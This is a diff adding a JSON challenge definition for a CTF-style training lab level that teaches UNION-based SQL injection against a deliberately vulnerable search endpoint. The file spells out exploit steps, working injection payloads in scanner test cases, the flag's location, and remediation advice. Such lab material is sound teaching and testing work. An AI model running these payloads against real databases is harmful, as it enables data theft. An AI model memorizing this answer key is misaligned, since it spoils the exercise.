@@ -1,0 +1,160 @@
+{
+  "realm": "NIDAVELLIR",
+  "level": 5,
+  "owasp": "A05:2025",
+  "title": "Injection",
+  "description": "Nidavellir demonstrates UNION-based SQL injection through a vulnerable artifact search system in the dwarven forge database.",
+  "theme": "Norse realm of dwarven smiths - where data is mined and forged",
+  "difficulty": "Medium",
+  "estimated_time_minutes": 25,
+  "vulnerabilities": [
+    {
+      "id": "NID-001",
+      "type": "UNION-Based SQL Injection",
+      "cwe": "CWE-89",
+      "cwe_name": "Improper Neutralization of Special Elements used in an SQL Command",
+      "cvss": {
+        "version": "3.1",
+        "score": 9.8,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "breakdown": {
+          "attack_vector": "Network",
+          "attack_complexity": "Low",
+          "privileges_required": "None",
+          "user_interaction": "None",
+          "scope": "Unchanged",
+          "confidentiality": "High",
+          "integrity": "High",
+          "availability": "High"
+        }
+      },
+      "endpoints": [
+        {
+          "method": "GET",
+          "path": "/api/artifacts/search",
+          "vulnerable": true,
+          "parameters": {
+            "q": "string (search query - injectable)"
+          },
+          "description": "Search endpoint with direct string concatenation in SQL query"
+        },
+        {
+          "method": "GET",
+          "path": "/api/artifacts",
+          "vulnerable": false,
+          "description": "List all artifacts - safe endpoint"
+        },
+        {
+          "method": "GET",
+          "path": "/api/artifacts/:id",
+          "vulnerable": false,
+          "description": "Get artifact by ID - uses parameterized query (secure example)"
+        }
+      ],
+      "description": "The artifact search endpoint concatenates user input directly into SQL queries without sanitization. This allows UNION SELECT attacks to extract data from other tables, specifically the 'secrets' table containing the flag.",
+      "impact": "Complete database compromise, data exfiltration, access to sensitive credentials and flags, potential data modification or deletion",
+      "exploit_steps": [
+        "Access /api/artifacts/search endpoint",
+        "Test basic SQL injection: ?q=' OR '1'='1'--",
+        "Determine column count: ?q=' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "Identify column types by replacing NULLs with test values",
+        "Discover secrets table structure: ?q=' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--",
+        "Extract flag: ?q=' UNION SELECT id,realm,access_code,security_level,NULL,NULL,NULL FROM secrets--",
+        "Parse response to find NIDAVELLIR access code (flag)"
+      ],
+      "exploit_indicators": [
+        "Single quotes in search query",
+        "UNION SELECT keywords",
+        "SQL comment syntax (-- or /*)",
+        "NULL keyword repetition",
+        "information_schema queries",
+        "Attempts to access 'secrets' table",
+        "Error messages exposing SQL syntax"
+      ],
+      "remediation": "Use parameterized queries (prepared statements) for all SQL operations. Implement input validation and sanitization. Use ORM frameworks that handle escaping. Apply principle of least privilege to database accounts. Implement WAF rules to detect SQL injection patterns.",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/89.html",
+        "https://owasp.org/Top10/A03_2021-Injection/",
+        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+        "https://portswigger.net/web-security/sql-injection/union-attacks"
+      ]
+    }
+  ],
+  "flags": {
+    "format": "YGGDRASIL\\{NIDAVELLIR:[a-f0-9-]{36}\\}",
+    "location": "secrets_table",
+    "retrieval_method": "Use UNION SELECT to extract access_code from secrets table where realm='NIDAVELLIR'"
+  },
+  "realm_chaining": {
+    "unlocks": "VANAHEIM",
+    "unlocked_by": "MUSPELHEIM"
+  },
+  "learning_objectives": [
+    "Understand SQL injection attack mechanics",
+    "Learn UNION-based SQL injection techniques",
+    "Practice column enumeration",
+    "Understand information_schema exploitation",
+    "Learn difference between parameterized and unsafe queries",
+    "Practice database enumeration techniques"
+  ],
+  "technologies": [
+    "Node.js",
+    "Express",
+    "TypeScript",
+    "PostgreSQL",
+    "node-postgres (pg)"
+  ],
+  "scanner_test_cases": [
+    {
+      "name": "Detect SQL injection with basic payload",
+      "request": {
+        "method": "GET",
+        "path": "/api/artifacts/search?q=' OR '1'='1'--"
+      },
+      "expected_response": {
+        "status": 200,
+        "body_contains": ["artifacts"]
+      }
+    },
+    {
+      "name": "Detect UNION SELECT vulnerability",
+      "request": {
+        "method": "GET",
+        "path": "/api/artifacts/search?q=' UNION SELECT 1,2,3,4,5,6,7--"
+      },
+      "expected_response": {
+        "status_one_of": [200, 500],
+        "notes": "Should either succeed or return SQL error"
+      }
+    },
+    {
+      "name": "Test information_schema access",
+      "request": {
+        "method": "GET",
+        "path": "/api/artifacts/search?q=' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--"
+      },
+      "expected_response": {
+        "status": 200,
+        "body_contains": ["artifacts", "secrets"]
+      }
+    },
+    {
+      "name": "Verify secure endpoint is not vulnerable",
+      "request": {
+        "method": "GET",
+        "path": "/api/artifacts/1' OR '1'='1"
+      },
+      "expected_response": {
+        "status": 404,
+        "notes": "Parameterized query should safely handle malicious input"
+      }
+    }
+  ],
+  "metadata": {
+    "created": "2026-01-21",
+    "last_updated": "2026-01-21",
+    "version": "1.0.0",
+    "maintainer": "Project Yggdrasil",
+    "validated": true
+  }
+}
